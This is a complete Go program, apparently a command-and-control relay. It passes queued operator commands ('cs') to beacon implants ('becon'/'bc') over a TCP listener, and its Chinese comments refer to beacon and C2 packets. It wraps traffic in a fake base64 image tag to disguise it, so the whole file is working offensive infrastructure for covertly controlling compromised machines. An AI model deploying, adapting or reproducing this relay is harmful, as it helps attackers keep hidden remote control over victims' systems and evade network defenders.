package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

var (
	readsize = 4096
	CsChan   = make(chan string, 10000)
	BcChan   = make(chan string, 10000)
	noneflag = "Tk9ORQ=="
	sendflag = "TO:SEND"
	connflag = "TO:CONNECT"
	getflag  = "TO:GET"
	str1     = "================"
	str2     = "<img src=\"data:image/jpg;base64,"
	str3     = "\" />"
	port     = 64535
	level    = 0
	timeout  = 10
)

func init() {
	flag.IntVar(&port, "p", 64535, "port")
	flag.IntVar(&level, "v", 0, "log level")
	flag.IntVar(&timeout, "t", 10, "timeout")
	flag.Parse()
}

// main函数
func main() {
	Listen, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%v", port))
	if err != nil {
		fmt.Println("Listen error: %s", err.Error())
		os.Exit(1)
	}
	defer Listen.Close()
	for {
		conn, err := Listen.Accept()
		if err != nil {
			continue
		}
		go handleConn(conn)
	}
}

// 获取数据
func handleConn(conn net.Conn) {
	defer conn.Close()
	data, err := read(conn)

	if err != nil {
		return
	}

	length := 30
	if len(data) <= length {
		length = len(data)
	}

	switch {
	case strings.Contains(string(data[:length]), connflag):
		Println(connflag)
		//cs来获取数据
	case strings.Contains(string(data[:length]), getflag):
		//发送bc缓存的数据
		Println(getflag)
		//cs来发送命令
	case bytes.Contains(data[:length], []byte(sendflag)):
		Println(sendflag)
	default:
		Println("default")
	}

	Println(fmt.Sprintf("%v %v", "read ", (len(data))))
	Println2(data)

	switch {
	case strings.Contains(string(data[:length]), connflag):
		write(conn, []byte(noneflag))
	//cs来获取数据
	case strings.Contains(string(data[:length]), getflag):
		//发送bc缓存的数据
		if len(BcChan) == 0 {
			write(conn, []byte(noneflag))
			return
		}

		tmp, ok := <-BcChan
		if ok {
			write(conn, []byte(tmp))
		} else {
			write(conn, []byte(noneflag))
		}
		//cs来发送数据
	case bytes.Contains(data[:length], []byte(sendflag)):
		Println(sendflag)
		index := bytes.Index(data, []byte(sendflag))
		data = data[index+len(sendflag):]
		index1 := bytes.Index(data, []byte(str2))
		if index1 >= 0 {
			data = data[index1+len(str2):]
		}
		index2 := bytes.Index(data, []byte(str3))
		if index2 >= 0 {
			data = data[:index2]
		}
		CsChan <- string(data)
		write(conn, []byte(noneflag))
	default:
		Println("default")
		//接收becon数据包
		BcChan <- base64.RawURLEncoding.EncodeToString(data)
		start := time.Now()
		//等待c2的数据包
		for len(CsChan) == 0 && time.Now().Sub(start) < time.Duration(timeout)*time.Second {

		}
		if len(CsChan) == 0 {
			fmt.Println("len cschan = 0")
			write(conn, []byte(noneflag))
			return
		}
		Println("default write")
		//发送c2的数据包
		tmp, ok := <-CsChan
		if ok {
			encoded, err := base64.RawURLEncoding.DecodeString(tmp)
			if err != nil {
				fmt.Println("base64decode failed: ", err)
				Println2([]byte(tmp))
			} else {
				write1(conn, encoded)
			}
			return
		} else {
			write(conn, []byte(noneflag))
		}
	}
}

func read(conn net.Conn) (result []byte, err error) {
	buf := make([]byte, readsize)
	for {
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			break
		}
		result = append(result, buf[:n]...)
		if n < readsize {
			break
		}
	}
	return result, err
}

func write(conn net.Conn, data []byte) (n int, err error) {
	Println(fmt.Sprintf("%v %v", "write ", (len(data))))
	Println2(data)
	data = append([]byte(str2), data...)
	data = append(data, []byte(str3)...)
	n, err = conn.Write(data)
	return
}

func write1(conn net.Conn, data []byte) (n int, err error) {
	Println(fmt.Sprintf("%v %v", "write ", (len(data))))
	Println2(data)
	n, err = conn.Write(data)
	return
}

func Println(result string) {
	if level > 0 {
		fmt.Println(str1, result, str1, "CsChan:", len(CsChan), "BcChan:", len(BcChan))
	}
}

func Println2(data []byte) {
	switch level {
	case 2:
		num := 1000
		if len(data) > num {
			fmt.Println(string(data[:num]))
		} else {
			fmt.Println(string(data))
		}
	case 3:
		fmt.Println(string(data))
	default:
	}
}
